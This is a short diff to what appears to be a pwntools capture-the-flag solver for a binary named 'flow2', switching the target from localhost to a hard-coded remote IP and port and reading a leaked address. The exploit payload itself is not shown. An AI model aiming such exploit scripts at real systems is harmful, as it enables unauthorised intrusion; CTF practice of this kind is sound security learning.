@@ -5,7 +5,9 @@ from pwn import p64
 def solve():
     # context.binary = ELF('./flow2')
     # p = process()
-    p = remote("localhost", 2002)
+    ip = "104.248.97.237"
+    # p = remote("localhost", 2002)
+    p = remote(ip, 1345)
     p.recvuntil(b'0x')
     addr = int(p.recvline().decode('utf-8'),16)
     print("addr:", addr, hex(addr))
